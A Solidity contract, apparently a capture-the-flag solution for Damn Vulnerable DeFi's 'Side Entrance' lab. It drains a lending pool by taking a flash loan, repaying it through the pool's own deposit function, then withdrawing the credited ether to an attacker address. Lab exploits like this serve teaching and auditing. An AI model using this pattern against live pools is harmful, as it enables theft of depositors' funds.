// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract AttackerSideEntrance {
   SideEntranceLenderPool pool;
   address attacker;
constructor(address _pool , address _attacker){
    pool = SideEntranceLenderPool(_pool);

attacker = _attacker;
}
   
    function execute() external payable{
        pool.deposit{value:msg.value}();
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
        pool.withdraw();
    }
     receive() external payable{
        attacker.call{value:msg.value}("");
    }
}
